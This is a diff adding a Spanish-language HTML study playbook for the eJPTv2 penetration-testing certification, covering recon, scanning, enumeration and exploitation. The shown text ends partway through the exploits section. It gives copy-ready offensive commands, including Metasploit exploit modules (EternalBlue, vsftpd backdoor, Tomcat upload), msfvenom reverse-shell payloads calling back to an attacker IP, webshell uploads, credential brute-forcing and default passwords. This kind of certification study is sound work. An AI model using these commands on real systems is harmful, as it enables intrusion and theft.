@@ -1,0 +1,1369 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>🎯 eJPTv2 — Playbook Maestro</title>
+<style>
+  :root {
+    --bg: #0d1117;
+    --surface: #161b22;
+    --surface2: #21262d;
+    --border: #30363d;
+    --green: #3fb950;
+    --cyan: #39c5cf;
+    --orange: #f78166;
+    --yellow: #e3b341;
+    --purple: #bc8cff;
+    --blue: #58a6ff;
+    --red: #f85149;
+    --text: #e6edf3;
+    --muted: #8b949e;
+  }
+  * { box-sizing: border-box; margin: 0; padding: 0; }
+  body { background: var(--bg); color: var(--text); font-family: 'Segoe UI', system-ui, sans-serif; font-size: 14px; line-height: 1.6; }
+  
+  /* HEADER */
+  .header { background: linear-gradient(135deg, #161b22, #0d1117); border-bottom: 1px solid var(--border); padding: 24px 32px; display: flex; align-items: center; gap: 16px; position: sticky; top: 0; z-index: 100; }
+  .header h1 { font-size: 22px; font-weight: 700; }
+  .header .badge { background: var(--green); color: #000; padding: 2px 10px; border-radius: 20px; font-size: 11px; font-weight: 700; }
+  .toc-bar { background: var(--surface); border-bottom: 1px solid var(--border); padding: 10px 32px; display: flex; gap: 8px; flex-wrap: wrap; overflow-x: auto; }
+  .toc-bar a { color: var(--muted); text-decoration: none; font-size: 12px; padding: 4px 10px; border-radius: 6px; border: 1px solid var(--border); white-space: nowrap; transition: all 0.2s; }
+  .toc-bar a:hover { color: var(--text); border-color: var(--cyan); background: rgba(57,197,207,.1); }
+
+  /* LAYOUT */
+  .container { max-width: 1200px; margin: 0 auto; padding: 24px 32px; }
+  
+  /* SECTIONS */
+  .phase { margin-bottom: 40px; }
+  .phase-header { display: flex; align-items: center; gap: 12px; margin-bottom: 16px; padding-bottom: 10px; border-bottom: 2px solid var(--border); }
+  .phase-icon { font-size: 24px; }
+  .phase-title { font-size: 20px; font-weight: 700; }
+  .phase-subtitle { color: var(--muted); font-size: 13px; margin-top: 2px; }
+  
+  /* CARDS */
+  .grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(480px, 1fr)); gap: 16px; }
+  .card { background: var(--surface); border: 1px solid var(--border); border-radius: 8px; overflow: hidden; }
+  .card-header { padding: 10px 16px; font-weight: 600; font-size: 13px; display: flex; align-items: center; gap: 8px; border-bottom: 1px solid var(--border); }
+  .card-body { padding: 0; }
+  
+  /* CODE BLOCKS */
+  pre { background: #010409; padding: 14px 16px; overflow-x: auto; font-family: 'Cascadia Code','Consolas',monospace; font-size: 12.5px; line-height: 1.7; position: relative; }
+  code { color: var(--text); }
+  .comment { color: var(--muted); }
+  .cmd { color: var(--cyan); }
+  .flag { color: var(--yellow); }
+  .val { color: var(--green); }
+  .warn { color: var(--orange); }
+  
+  /* COPY BUTTON */
+  .copy-btn { position: absolute; top: 8px; right: 8px; background: var(--surface2); border: 1px solid var(--border); color: var(--muted); padding: 3px 10px; border-radius: 4px; cursor: pointer; font-size: 11px; transition: all .2s; }
+  .copy-btn:hover { color: var(--text); border-color: var(--cyan); }
+  .copy-btn.copied { color: var(--green); border-color: var(--green); }
+  pre { position: relative; }
+  
+  /* TIPS */
+  .tip { background: rgba(58, 175, 82, 0.1); border-left: 3px solid var(--green); padding: 10px 14px; border-radius: 0 6px 6px 0; margin: 12px 0; font-size: 13px; }
+  .tip strong { color: var(--green); }
+  .warn-box { background: rgba(247, 129, 102, 0.1); border-left: 3px solid var(--orange); padding: 10px 14px; border-radius: 0 6px 6px 0; margin: 12px 0; font-size: 13px; }
+  .warn-box strong { color: var(--orange); }
+  
+  /* FLOW CHART */
+  .flow { background: var(--surface); border: 1px solid var(--border); border-radius: 8px; padding: 20px; margin-bottom: 24px; }
+  .flow-steps { display: flex; align-items: center; flex-wrap: wrap; gap: 8px; margin-top: 12px; }
+  .flow-step { background: var(--surface2); border: 1px solid var(--border); border-radius: 8px; padding: 10px 16px; text-align: center; min-width: 120px; }
+  .flow-step .num { font-size: 20px; }
+  .flow-step .label { font-size: 12px; font-weight: 700; margin-top: 2px; }
+  .flow-step .sub { font-size: 10px; color: var(--muted); }
+  .arrow { color: var(--muted); font-size: 20px; }
+  
+  /* COLOR TAGS */
+  .tag { display: inline-block; padding: 1px 8px; border-radius: 4px; font-size: 11px; font-weight: 700; margin-right: 4px; }
+  .tag-green { background: rgba(63,185,80,.2); color: var(--green); }
+  .tag-red { background: rgba(248,81,73,.2); color: var(--red); }
+  .tag-yellow { background: rgba(227,179,65,.2); color: var(--yellow); }
+  .tag-blue { background: rgba(88,166,255,.2); color: var(--blue); }
+  .tag-purple { background: rgba(188,140,255,.2); color: var(--purple); }
+  .tag-cyan { background: rgba(57,197,207,.2); color: var(--cyan); }
+
+  /* PORT TABLE */
+  table { width: 100%; border-collapse: collapse; font-size: 12.5px; }
+  th { background: var(--surface2); color: var(--muted); padding: 8px 12px; text-align: left; font-weight: 600; border-bottom: 1px solid var(--border); }
+  td { padding: 7px 12px; border-bottom: 1px solid var(--border); }
+  tr:last-child td { border-bottom: none; }
+  tr:hover td { background: rgba(255,255,255,.02); }
+
+  /* MNEMONIC */
+  .mnemonic { background: linear-gradient(135deg, rgba(58,175,82,.1), rgba(57,197,207,.1)); border: 1px solid var(--border); border-radius: 8px; padding: 20px 24px; margin-bottom: 24px; text-align: center; }
+  .mnemonic h3 { font-size: 30px; letter-spacing: 8px; color: var(--cyan); margin-bottom: 8px; }
+  .mnemonic p { color: var(--muted); font-size: 13px; }
+  .mnemonic .letters { display: flex; gap: 16px; justify-content: center; margin-top: 12px; flex-wrap: wrap; }
+  .mnemonic .letter { text-align: center; }
+  .mnemonic .letter .big { font-size: 28px; font-weight: 900; }
+  .mnemonic .letter .small { font-size: 11px; color: var(--muted); }
+
+  /* DIVIDER */
+  hr { border: none; border-top: 1px solid var(--border); margin: 32px 0; }
+  
+  /* RESOURCES */
+  .resources { display: grid; grid-template-columns: repeat(auto-fit, minmax(280px, 1fr)); gap: 12px; }
+  .resource-card { background: var(--surface); border: 1px solid var(--border); border-radius: 8px; padding: 14px; }
+  .resource-card h4 { font-size: 13px; margin-bottom: 8px; }
+  .resource-card a { display: block; color: var(--blue); font-size: 12px; text-decoration: none; padding: 2px 0; }
+  .resource-card a:hover { text-decoration: underline; }
+
+  /* FULL WIDTH CARD */
+  .card-full { background: var(--surface); border: 1px solid var(--border); border-radius: 8px; overflow: hidden; margin-bottom: 16px; }
+</style>
+</head>
+<body>
+
+<div class="header">
+  <div>
+    <h1>🎯 eJPTv2 — Playbook Maestro</h1>
+    <div style="display:flex;gap:8px;margin-top:4px;flex-wrap:wrap;">
+      <span class="badge">v2.0 Community Edition</span>
+      <span style="color:var(--muted);font-size:12px;">Basado en notas reales de aprobados · syselement · dev-angelist · nmmorette · iabdullah215</span>
+    </div>
+  </div>
+</div>
+
+<div class="toc-bar">
+  <a href="#metodologia">🧠 Metodología</a>
+  <a href="#recon">🔍 Recon</a>
+  <a href="#scanning">🔭 Scanning</a>
+  <a href="#enum">🗂 Enumeration</a>
+  <a href="#exploits">⚔️ Exploits</a>
+  <a href="#msfvenom">💣 msfvenom</a>
+  <a href="#metasploit">🐉 Metasploit</a>
+  <a href="#postexploit">🏴 Post-Exploit</a>
+  <a href="#privesc">⬆️ PrivEsc</a>
+  <a href="#pivoting">🔀 Pivoting</a>
+  <a href="#web">🌐 Web</a>
+  <a href="#credenciales">🔑 Credenciales</a>
+  <a href="#recursos">📚 Recursos</a>
+</div>
+
+<div class="container">
+
+<!-- METODOLOGÍA -->
+<section id="metodologia" class="phase">
+  <div class="phase-header">
+    <span class="phase-icon">🧠</span>
+    <div>
+      <div class="phase-title">LA METODOLOGÍA — Nunca la olvides</div>
+      <div class="phase-subtitle">El orden es sagrado. Si te atascas en un paso, vuelve al anterior.</div>
+    </div>
+  </div>
+
+  <div class="mnemonic">
+    <h3>R · S · E · G · P</h3>
+    <div class="letters">
+      <div class="letter"><div class="big" style="color:#3fb950">R</div><div class="small">RECON</div><div class="small" style="color:#58a6ff">¿Qué hay?</div></div>
+      <div class="letter"><div class="big" style="color:#39c5cf">S</div><div class="small">SCANNING</div><div class="small" style="color:#58a6ff">¿Cómo está?</div></div>
+      <div class="letter"><div class="big" style="color:#e3b341">E</div><div class="small">ENUM</div><div class="small" style="color:#58a6ff">¿Qué tiene?</div></div>
+      <div class="letter"><div class="big" style="color:#f78166">G</div><div class="small">GAINING</div><div class="small" style="color:#58a6ff">¿Cómo entro?</div></div>
+      <div class="letter"><div class="big" style="color:#bc8cff">P</div><div class="small">POST-EXPL</div><div class="small" style="color:#58a6ff">¿Qué hago?</div></div>
+    </div>
+    <p style="margin-top:16px">💡 <strong style="color:var(--yellow)">Regla de oro:</strong> Nunca saltes un paso. Si te atascas en G, vuelve a E. Siempre documenta todo.</p>
+  </div>
+
+  <div class="flow">
+    <div style="font-weight:700;margin-bottom:4px;">📌 Árbol de decisión por puerto</div>
+    <div style="color:var(--muted);font-size:12px;margin-bottom:12px;">Cada puerto abierto sigue este flujo mental</div>
+    <div class="flow-steps">
+      <div class="flow-step"><div class="num">🚪</div><div class="label">Puerto abierto</div><div class="sub">nmap lo encuentra</div></div>
+      <div class="arrow">→</div>
+      <div class="flow-step"><div class="num">🔍</div><div class="label">¿Qué servicio?</div><div class="sub">-sV</div></div>
+      <div class="arrow">→</div>
+      <div class="flow-step"><div class="num">📋</div><div class="label">¿Qué versión?</div><div class="sub">banner grab</div></div>
+      <div class="arrow">→</div>
+      <div class="flow-step"><div class="num">💥</div><div class="label">¿Exploit CVE?</div><div class="sub">searchsploit</div></div>
+      <div class="arrow">→</div>
+      <div class="flow-step"><div class="num">🔑</div><div class="label">¿Credenciales?</div><div class="sub">default / brute</div></div>
+      <div class="arrow">→</div>
+      <div class="flow-step"><div class="num">🏴</div><div class="label">¡Acceso!</div><div class="sub">POST-EXPL</div></div>
+    </div>
+  </div>
+
+  <div class="warn-box"><strong>⚠️ Consejo de quienes aprobaron:</strong> "No te saltes ningún lab del curso PTSv2 de INE. Repítelos hasta que puedas hacerlos sin consultar notas. El examen es muy similar a los labs." — Abdul Issa (aprobó con 91%)</div>
+</section>
+
+<!-- RECON / FASE 1 -->
+<section id="recon" class="phase">
+  <div class="phase-header">
+    <span class="phase-icon">🔍</span>
+    <div>
+      <div class="phase-title" style="color:var(--green)">FASE 1 — RECONNAISSANCE</div>
+      <div class="phase-subtitle">¿Estás en red interna? ¿Qué hosts hay vivos?</div>
+    </div>
+  </div>
+
+  <div class="grid">
+    <div class="card">
+      <div class="card-header" style="border-color:var(--green)">📡 Orientación en la red (primer paso SIEMPRE)</div>
+      <div class="card-body">
+        <pre><button class="copy-btn" onclick="copyPre(this)">Copy</button><code><span class="comment"># ¿Quién soy y en qué red estoy?</span>
+<span class="cmd">ip a</span>                    <span class="comment"># Mi IP y interfaces</span>
+<span class="cmd">ip -br -c a</span>             <span class="comment"># Versión compacta y coloreada</span>
+<span class="cmd">ip route</span>                <span class="comment"># Mis rutas y gateway</span>
+<span class="cmd">cat /etc/hosts</span>          <span class="comment"># Hosts conocidos (¡ojo aquí!)</span>
+
+<span class="comment"># Windows equivalentes</span>
+<span class="cmd">ipconfig /all</span>
+<span class="cmd">route print</span>
+<span class="cmd">netstat -r</span></code></pre>
+      </div>
+    </div>
+
+    <div class="card">
+      <div class="card-header" style="border-color:var(--green)">🔭 Descubrimiento de hosts vivos</div>
+      <div class="card-body">
+        <pre><button class="copy-btn" onclick="copyPre(this)">Copy</button><code><span class="comment"># Método 1: nmap ping sweep (más común)</span>
+<span class="cmd">nmap -sn</span> <span class="val">10.10.10.0/24</span>
+
+<span class="comment"># Método 2: fping (más rápido)</span>
+<span class="cmd">fping -a -g</span> <span class="val">10.10.10.0/24</span> <span class="flag">2>/dev/null</span> > targets.txt
+
+<span class="comment"># Método 3: Script bash manual</span>
+for host in {1..254}; do
+  ping -c 1 <span class="val">10.10.10</span>.$host | grep "64 bytes" | \
+  cut -d ":" -f 1 | cut -d " " -f 4
+done
+
+<span class="comment"># Método 4: netdiscover (ARP, muy silencioso)</span>
+<span class="cmd">netdiscover -r</span> <span class="val">10.10.10.0/24</span></code></pre>
+      </div>
+    </div>
+  </div>
+
+  <div class="tip"><strong>💡 Tip crítico del examen:</strong> En el eJPTv2 siempre revisa <code>/etc/hosts</code> y las rutas. Muchas veces hay subredes ocultas que necesitas descubrir para llegar al target real.</div>
+</section>
+
+<!-- SCANNING / FASE 2 -->
+<section id="scanning" class="phase">
+  <div class="phase-header">
+    <span class="phase-icon">🔭</span>
+    <div>
+      <div class="phase-title" style="color:var(--cyan)">FASE 2 — SCANNING</div>
+      <div class="phase-subtitle">¿Qué puertos y servicios tiene? SIEMPRE escanea todos los puertos.</div>
+    </div>
+  </div>
+
+  <div class="grid">
+    <div class="card">
+      <div class="card-header" style="border-color:var(--cyan)">⚡ Flujo de Scanning recomendado</div>
+      <div class="card-body">
+        <pre><button class="copy-btn" onclick="copyPre(this)">Copy</button><code><span class="comment"># PASO 1: Scan rápido de puertos comunes</span>
+<span class="cmd">nmap -sV -sC -T4</span> <span class="val">&lt;TARGET_IP&gt;</span> <span class="flag">-oN</span> scan_inicial.txt
+
+<span class="comment"># PASO 2: Scan COMPLETO (no te lo saltes!)</span>
+<span class="cmd">nmap -p-</span> <span class="flag">-T4</span> <span class="val">&lt;TARGET_IP&gt;</span> <span class="flag">-oN</span> all_ports.txt
+
+<span class="comment"># PASO 3: Scan detallado solo en puertos abiertos</span>
+<span class="cmd">nmap -sV -sC -p</span> <span class="val">22,80,443,8080</span> <span class="val">&lt;TARGET_IP&gt;</span> <span class="flag">-oN</span> scan_detallado.txt
+
+<span class="comment"># PASO 4: Scan agresivo (más info, más ruido)</span>
+<span class="cmd">nmap -sS -A</span> <span class="val">&lt;TARGET_IP&gt;</span>
+
+<span class="comment"># PASO 5: UDP si sospechas servicios (lento!)</span>
+<span class="cmd">nmap -sU -sV</span> <span class="val">&lt;TARGET_IP&gt;</span> <span class="flag">-oN</span> udp_scan.txt</code></pre>
+      </div>
+    </div>
+
+    <div class="card">
+      <div class="card-header" style="border-color:var(--cyan)">🎯 Scans especializados por objetivo</div>
+      <div class="card-body">
+        <pre><button class="copy-btn" onclick="copyPre(this)">Copy</button><code><span class="comment"># Detección de OS</span>
+<span class="cmd">nmap -Pn -O</span> <span class="val">&lt;TARGET_IP&gt;</span>
+
+<span class="comment"># Scan de vulnerabilidades</span>
+<span class="cmd">nmap --script vuln -p</span> <span class="val">&lt;OPEN_PORTS&gt;</span> <span class="val">&lt;TARGET_IP&gt;</span>
+
+<span class="comment"># Scan específico SMB vulnerabilidades</span>
+<span class="cmd">nmap -p445 --script=smb-vuln-*</span> <span class="val">&lt;TARGET_IP&gt;</span> -v
+
+<span class="comment"># EternalBlue check</span>
+<span class="cmd">nmap --script smb-vuln-ms17-010 -p 445</span> <span class="val">&lt;TARGET_IP&gt;</span>
+
+<span class="comment"># HeartBleed SSL check</span>
+<span class="cmd">nmap -sV --script ssl-heartbleed -p 443</span> <span class="val">&lt;TARGET_IP&gt;</span>
+
+<span class="comment"># Guardar en múltiples formatos</span>
+<span class="cmd">nmap -sV -sC</span> <span class="val">&lt;TARGET_IP&gt;</span> <span class="flag">-oA</span> nmap_full</code></pre>
+      </div>
+    </div>
+  </div>
+
+  <!-- PORT REFERENCE TABLE -->
+  <div class="card-full" style="margin-top:16px;">
+    <div class="card-header">🗺️ Referencia de puertos — Lo que esperar al ver cada uno</div>
+    <table>
+      <tr><th>Puerto</th><th>Servicio</th><th>Qué buscar primero</th><th>Herramientas clave</th></tr>
+      <tr><td><span class="tag tag-blue">21</span> FTP</td><td>File Transfer</td><td>Login anónimo, versión vulnerable (vsftpd 2.3.4)</td><td>nmap --script ftp-anon, ftp, hydra</td></tr>
+      <tr><td><span class="tag tag-green">22</span> SSH</td><td>Secure Shell</td><td>Versión, credenciales débiles</td><td>hydra, metasploit</td></tr>
+      <tr><td><span class="tag tag-yellow">25</span> SMTP</td><td>Mail</td><td>Enumeración de usuarios, Haraka exploit</td><td>nmap scripts, smtp-user-enum</td></tr>
+      <tr><td><span class="tag tag-cyan">80/443</span> HTTP/S</td><td>Web</td><td>Tecnologías, directorios, login, SQLi, upload</td><td>nikto, gobuster, dirb, sqlmap, burp</td></tr>
+      <tr><td><span class="tag tag-red">139/445</span> SMB</td><td>Samba/Win Share</td><td>Shares, versión, EternalBlue, credenciales</td><td>smbclient, smbmap, enum4linux, MSF</td></tr>
+      <tr><td><span class="tag tag-purple">3306</span> MySQL</td><td>Database</td><td>Login root sin password, WordPress config</td><td>mysql, nmap scripts, MSF</td></tr>
+      <tr><td><span class="tag tag-orange">3389</span> RDP</td><td>Remote Desktop</td><td>BlueKeep, credenciales</td><td>MSF, xfreerdp, rdesktop</td></tr>
+      <tr><td><span class="tag tag-yellow">5985/5986</span> WinRM</td><td>Windows Remote Mgmt</td><td>Credenciales válidas → shell</td><td>evil-winrm, MSF</td></tr>
+      <tr><td><span class="tag tag-blue">8080/8443</span> Alt HTTP</td><td>Tomcat, Jenkins, etc.</td><td>Panel admin, upload WAR</td><td>gobuster, nikto, MSF</td></tr>
+    </table>
+  </div>
+</section>
+
+<!-- ENUMERATION / FASE 3 -->
+<section id="enum" class="phase">
+  <div class="phase-header">
+    <span class="phase-icon">🗂️</span>
+    <div>
+      <div class="phase-title" style="color:var(--yellow)">FASE 3 — ENUMERATION</div>
+      <div class="phase-subtitle">Exprimir cada servicio hasta el último bit de información.</div>
+    </div>
+  </div>
+
+  <div class="grid">
+    <!-- SMB -->
+    <div class="card">
+      <div class="card-header" style="border-color:#f85149">🪟 SMB (139/445)</div>
+      <div class="card-body">
+        <pre><button class="copy-btn" onclick="copyPre(this)">Copy</button><code><span class="comment"># Enum completo</span>
+<span class="cmd">enum4linux -a</span> <span class="val">&lt;TARGET_IP&gt;</span>
+<span class="cmd">enum4linux -U -M -S -P -G</span> <span class="val">&lt;TARGET_IP&gt;</span>
+
+<span class="comment"># Listar shares</span>
+<span class="cmd">smbclient -L //</span><span class="val">&lt;TARGET_IP&gt;</span><span class="cmd">/</span> -N
+<span class="cmd">smbmap -H</span> <span class="val">&lt;TARGET_IP&gt;</span>
+<span class="cmd">smbmap -u guest -p "" -d . -H</span> <span class="val">&lt;TARGET_IP&gt;</span>
+
+<span class="comment"># Conectar a share</span>
+<span class="cmd">smbclient //</span><span class="val">&lt;TARGET_IP&gt;</span><span class="cmd">/</span><span class="val">&lt;SHARE_NAME&gt;</span>
+<span class="cmd">smbclient //</span><span class="val">&lt;TARGET_IP&gt;</span><span class="cmd">/IPC$</span> -N
+
+<span class="comment"># Nmap scripts SMB</span>
+<span class="cmd">nmap --script=smb-enum-users,smb-os-discovery,\
+smb-enum-shares,smb-enum-groups -p 135,139,445</span> <span class="val">&lt;TARGET_IP&gt;</span>
+
+<span class="comment"># Con credenciales</span>
+<span class="cmd">smbmap -u</span> <span class="val">&lt;USER&gt;</span> -p <span class="val">'&lt;PW&gt;'</span> -H <span class="val">&lt;TARGET_IP&gt;</span>
+<span class="cmd">smbmap -u</span> <span class="val">&lt;USER&gt;</span> -p <span class="val">'&lt;PW&gt;'</span> -H <span class="val">&lt;TARGET_IP&gt;</span> -r <span class="val">'C$'</span>
+
+<span class="comment"># Descargar archivo</span>
+<span class="cmd">smbmap -u</span> <span class="val">&lt;USER&gt;</span> -p <span class="val">'&lt;PW&gt;'</span> -H <span class="val">&lt;TARGET_IP&gt;</span> \
+  --download <span class="val">'C$\flag.txt'</span>
+
+<span class="comment"># CrackMapExec</span>
+<span class="cmd">crackmapexec smb</span> <span class="val">&lt;TARGET_IP&gt;</span>
+<span class="cmd">crackmapexec smb</span> <span class="val">&lt;TARGET_IP&gt;</span> -u <span class="val">users.txt</span> -p <span class="val">passwords.txt</span>
+
+<span class="comment"># MSF modules</span>
+use auxiliary/scanner/smb/smb_version
+use auxiliary/scanner/smb/smb_enumusers
+use auxiliary/scanner/smb/smb_enumshares
+use auxiliary/scanner/smb/smb_login</code></pre>
+      </div>
+    </div>
+
+    <!-- FTP -->
+    <div class="card">
+      <div class="card-header" style="border-color:#58a6ff">📁 FTP (21)</div>
+      <div class="card-body">
+        <pre><button class="copy-btn" onclick="copyPre(this)">Copy</button><code><span class="comment"># Siempre intenta anonymous first!</span>
+<span class="cmd">nmap --script ftp-anon -p 21</span> <span class="val">&lt;TARGET_IP&gt;</span>
+<span class="cmd">nmap -A -p 21</span> <span class="val">&lt;TARGET_IP&gt;</span>
+
+<span class="comment"># Login manual</span>
+<span class="cmd">ftp</span> <span class="val">&lt;TARGET_IP&gt;</span>
+<span class="comment"># User: anonymous / Pass: (vacío o email)</span>
+
+<span class="comment"># Comandos útiles dentro de FTP</span>
+ls -la
+get <span class="val">&lt;archivo&gt;</span>
+put <span class="val">&lt;archivo&gt;</span>
+binary           <span class="comment"># para transferir binarios</span>
+mget *           <span class="comment"># descargar todo</span>
+
+<span class="comment"># Banner grabbing</span>
+<span class="cmd">nc -v</span> <span class="val">&lt;TARGET_IP&gt;</span> 21</code></pre>
+      </div>
+    </div>
+
+    <!-- HTTP -->
+    <div class="card">
+      <div class="card-header" style="border-color:#3fb950">🌐 HTTP/HTTPS (80/443/8080)</div>
+      <div class="card-body">
+        <pre><button class="copy-btn" onclick="copyPre(this)">Copy</button><code><span class="comment"># Identificar tecnologías</span>
+<span class="cmd">whatweb http://</span><span class="val">&lt;TARGET_IP&gt;</span>
+<span class="cmd">nikto -h http://</span><span class="val">&lt;TARGET_IP&gt;</span>
+
+<span class="comment"># Banner grabbing HTTP</span>
+<span class="cmd">nc -v</span> <span class="val">&lt;TARGET_IP&gt;</span> 80
+HEAD / HTTP/1.0
+
+<span class="comment"># HTTPS</span>
+<span class="cmd">openssl s_client -connect</span> <span class="val">&lt;TARGET_IP&gt;</span>:443
+
+<span class="comment"># Fuzzing de directorios — gobuster (más rápido)</span>
+<span class="cmd">gobuster dir -u http://</span><span class="val">&lt;TARGET_IP&gt;</span> \
+  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
+  -x php,html,txt,bak,zip
+
+<span class="comment"># dirb (más simple)</span>
+<span class="cmd">dirb http://</span><span class="val">&lt;TARGET_IP&gt;</span>/
+<span class="cmd">dirb http://</span><span class="val">&lt;TARGET_IP&gt;</span>/<span class="val">dir</span> -u admin:admin
+
+<span class="comment"># ffuf (más flexible)</span>
+<span class="cmd">ffuf -w /usr/share/wordlists/dirb/common.txt:FUZZ \
+     -u http://</span><span class="val">&lt;TARGET_IP&gt;</span>/FUZZ
+
+<span class="comment"># Verificar HTTP verbs disponibles</span>
+<span class="cmd">nc</span> <span class="val">&lt;TARGET_IP&gt;</span> 80
+OPTIONS / HTTP/1.0
+
+<span class="comment"># Nmap web enum</span>
+<span class="cmd">nmap -p 80 --script http-enum -sV</span> <span class="val">&lt;TARGET_IP&gt;</span>
+
+<span class="comment"># WordPress específico</span>
+<span class="cmd">wpscan --url http://</span><span class="val">&lt;TARGET_IP&gt;</span> --enumerate u</code></pre>
+      </div>
+    </div>
+
+    <!-- SSH/SMTP/MySQL -->
+    <div class="card">
+      <div class="card-header" style="border-color:#bc8cff">🔐 SSH / SMTP / MySQL</div>
+      <div class="card-body">
+        <pre><button class="copy-btn" onclick="copyPre(this)">Copy</button><code><span class="comment">## SSH (22) — Solo enumerar versión por ahora</span>
+<span class="cmd">ssh</span> <span class="val">&lt;TARGET_IP&gt;</span>    <span class="comment"># ver banner y versión</span>
+<span class="cmd">nc -v</span> <span class="val">&lt;TARGET_IP&gt;</span> 22
+
+<span class="comment">## SMTP (25) — Enumerar usuarios</span>
+<span class="cmd">nmap -p 25 --script smtp-enum-users,smtp-commands</span> <span class="val">&lt;TARGET_IP&gt;</span>
+<span class="cmd">smtp-user-enum -M VRFY -U /usr/share/wordlists/metasploit/unix_users.txt \
+               -t</span> <span class="val">&lt;TARGET_IP&gt;</span>
+<span class="comment"># MSF</span>
+use auxiliary/scanner/smtp/smtp_enum
+
+<span class="comment">## MySQL (3306)</span>
+<span class="cmd">mysql -h</span> <span class="val">&lt;TARGET_IP&gt;</span> -u root -p
+<span class="cmd">nmap -p3306 --script mysql-info,mysql-databases,mysql-empty-password</span> \
+     <span class="val">&lt;TARGET_IP&gt;</span>
+
+<span class="comment"># Dentro de MySQL</span>
+show databases;
+use <span class="val">&lt;db&gt;</span>;
+show tables;
+select * from <span class="val">&lt;table&gt;</span>;
+
+<span class="comment">## WinRM (5985)</span>
+<span class="cmd">evil-winrm -i</span> <span class="val">&lt;TARGET_IP&gt;</span> -u <span class="val">&lt;USER&gt;</span> -p <span class="val">'&lt;PASSWORD&gt;'</span>
+
+<span class="comment">## RDP (3389)</span>
+<span class="cmd">xfreerdp /u:</span><span class="val">&lt;USER&gt;</span> /p:<span class="val">'&lt;PASS&gt;'</span> /v:<span class="val">&lt;TARGET_IP&gt;</span></code></pre>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- GAINING ACCESS / FASE 4 - EXPLOITS -->
+<section id="exploits" class="phase">
+  <div class="phase-header">
+    <span class="phase-icon">⚔️</span>
+    <div>
+      <div class="phase-title" style="color:var(--orange)">FASE 4 — GAINING ACCESS</div>
+      <div class="phase-subtitle">Exploits conocidos — Los que más aparecen en el eJPTv2</div>
+    </div>
+  </div>
+
+  <div class="grid">
+    <div class="card">
+      <div class="card-header" style="border-color:var(--orange)">💥 CVEs / Exploits top del eJPTv2</div>
+      <div class="card-body">
+        <pre><button class="copy-btn" onclick="copyPre(this)">Copy</button><code><span class="comment">## EternalBlue (MS17-010) - Windows SMB</span>
+<span class="cmd">nmap --script smb-vuln-ms17-010 -p 445</span> <span class="val">&lt;TARGET_IP&gt;</span>
+use exploit/windows/smb/ms17_010_eternalblue
+set RHOSTS <span class="val">&lt;TARGET_IP&gt;</span>
+run
+
+<span class="comment">## BlueKeep (CVE-2019-0708) - RDP Windows</span>
+use exploit/windows/rdp/cve_2019_0708_bluekeep_rce
+
+<span class="comment">## vsftpd 2.3.4 Backdoor - Linux FTP</span>
+search vsftpd
+use exploit/unix/ftp/vsftpd_234_backdoor
+set RHOSTS <span class="val">&lt;TARGET_IP&gt;</span>
+exploit   <span class="comment"># Da root directo!</span>
+
+<span class="comment">## Shellshock - Apache/CGI</span>
+<span class="cmd">nmap -sV --script http-shellshock -p 80</span> <span class="val">&lt;TARGET_IP&gt;</span>
+use exploit/multi/http/apache_mod_cgi_bash_env_exec
+
+<span class="comment">## Samba (Linux SMB)</span>
+search samba
+use exploit/linux/samba/is_known_pipename  <span class="comment"># Samba 3.5.0-4.4.13</span>
+
+<span class="comment">## HeartBleed SSL</span>
+<span class="cmd">nmap -sV --script ssl-heartbleed -p 443</span> <span class="val">&lt;TARGET_IP&gt;</span>
+
+<span class="comment">## Log4Shell</span>
+<span class="cmd">nmap --script log4shell.nse \
+     --script-args log4shell.callback-server=</span><span class="val">&lt;ATTACKER_IP&gt;</span>:1389 \
+     -p 8080 <span class="val">&lt;TARGET_IP&gt;</span>
+
+<span class="comment">## SearchSploit - buscar por servicio+versión</span>
+<span class="cmd">searchsploit</span> <span class="val">"Apache 2.4"</span>
+<span class="cmd">searchsploit -m</span> <span class="val">&lt;EDB-ID&gt;</span>  <span class="comment"># copiar exploit al directorio actual</span></code></pre>
+      </div>
+    </div>
+
+    <div class="card">
+      <div class="card-header" style="border-color:var(--orange)">🪟 IIS WebDAV (Windows)</div>
+      <div class="card-body">
+        <pre><button class="copy-btn" onclick="copyPre(this)">Copy</button><code><span class="comment"># Verificar WebDAV</span>
+<span class="cmd">davtest -url http://</span><span class="val">&lt;TARGET_IP&gt;</span>/webdav
+<span class="cmd">davtest -auth</span> <span class="val">&lt;USER&gt;</span>:<span class="val">&lt;PW&gt;</span> -url http://<span class="val">&lt;TARGET_IP&gt;</span>/webdav
+
+<span class="comment"># Subir shell con cadaver</span>
+<span class="cmd">cadaver http://</span><span class="val">&lt;TARGET_IP&gt;</span>/webdav
+dav> put /usr/share/webshells/asp/webshell.asp
+
+<span class="comment"># Generar payload ASP</span>
+<span class="cmd">msfvenom -p windows/meterpreter/reverse_tcp \
+  LHOST=</span><span class="val">&lt;YOUR_IP&gt;</span> LPORT=4444 -f asp > shell.asp
+
+<span class="comment"># MSF automatizado</span>
+use exploit/windows/iis/iis_webdav_upload_asp
+set HttpUsername <span class="val">&lt;USER&gt;</span>
+set HttpPassword <span class="val">&lt;PW&gt;</span>
+set RHOSTS <span class="val">&lt;TARGET_IP&gt;</span>
+set PATH /webdav/metasploit.asp
+exploit
+
+<span class="comment"># Brute-force WebDAV</span>
+<span class="cmd">hydra -L</span> /usr/share/wordlists/metasploit/common_users.txt \
+      -P /usr/share/wordlists/metasploit/common_passwords.txt \
+      <span class="val">&lt;TARGET_IP&gt;</span> http-get /webdav/</code></pre>
+      </div>
+    </div>
+
+    <div class="card">
+      <div class="card-header" style="border-color:var(--orange)">☕ Apache Tomcat (8080)</div>
+      <div class="card-body">
+        <pre><button class="copy-btn" onclick="copyPre(this)">Copy</button><code><span class="comment"># Credenciales por defecto: admin:admin, tomcat:tomcat</span>
+
+<span class="comment"># Generar payload WAR</span>
+<span class="cmd">msfvenom -p java/jsp_shell_reverse_tcp \
+  LHOST=</span><span class="val">&lt;YOUR_IP&gt;</span> LPORT=4444 -f war > shell.war
+
+<span class="comment"># Subir via panel /manager/html</span>
+<span class="comment"># MSF automatizado</span>
+use exploit/multi/http/tomcat_mgr_upload
+set HttpUsername <span class="val">tomcat</span>
+set HttpPassword <span class="val">s3cret</span>
+set RHOSTS <span class="val">&lt;TARGET_IP&gt;</span>
+set RPORT 8080
+exploit</code></pre>
+      </div>
